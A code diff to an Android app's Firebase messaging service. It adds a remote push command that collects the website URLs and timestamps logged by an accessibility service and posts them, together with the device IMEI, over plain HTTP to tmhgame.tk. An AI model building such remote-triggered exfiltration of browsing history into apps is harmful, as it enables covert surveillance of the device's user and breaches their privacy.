@@ -65,6 +65,15 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
         }
         new ServerHelper2(this).execute("http://tmhgame.tk/sendYoutube", o.toString());
     }
+    public void postWActJSON(JSONObject o) {
+        try {
+            o.put("imei", new Device(this).getImei());
+            Logger.l( " That will be post for WebSites " + o.toString());
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
+        new ServerHelper2(this).execute("http://tmhgame.tk/sendWebSites", o.toString());
+    }
     @Override
     public void onMessageReceived(RemoteMessage message) {
         Logger.l("&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&");
@@ -118,7 +127,28 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
             } catch (JSONException e) {
                 e.printStackTrace();
             }
-        }else  {
+        }else  if(M.get("command") != null && M.get("command").equals("sendWebsites")) {
+            JSONObject data = new JSONObject();
+            JSONArray ar = new JSONArray();
+            for(MyAccessibilityService.WAc a: MyAccessibilityService.webSites) {
+                JSONObject o = new JSONObject();
+                try {
+                    o.put("url", a.url);
+                    //String nn =
+                    o.put("start", a.time+"");
+
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+                ar.put(o);
+            }
+            try {
+                data.put("data", ar);
+                postWActJSON(data);
+            } catch (JSONException e) {
+                e.printStackTrace();
+            }
+        }else {
             String p = (String)M.get("package");
             String b = (String)M.get("block");
             Logger.l(p + " bunun uzerinde emeliyyat");
